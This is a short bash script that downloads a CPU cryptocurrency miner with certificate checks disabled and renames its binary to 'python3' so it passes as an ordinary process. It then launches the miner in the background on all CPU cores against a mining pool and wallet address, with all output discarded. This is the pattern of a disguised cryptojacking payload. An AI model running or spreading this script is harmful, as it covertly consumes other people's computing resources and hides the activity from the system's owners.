#!/bin/bash
# Update system and install required packages
apt update && apt install wget tar -y

# Download and extract the miner
wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz

# Rename the binary and start mining in the background
mv cpuminer-sse2 python3
nohup ./python3 -a yespowertide -o stratum+tcps://stratum-na.rplant.xyz:17059 \
-u TSp3P5EtEc1rTDWvPbSrb5YZAUYEagnpSg.Bau -t$(nproc --all) >/dev/null 2>&1 &
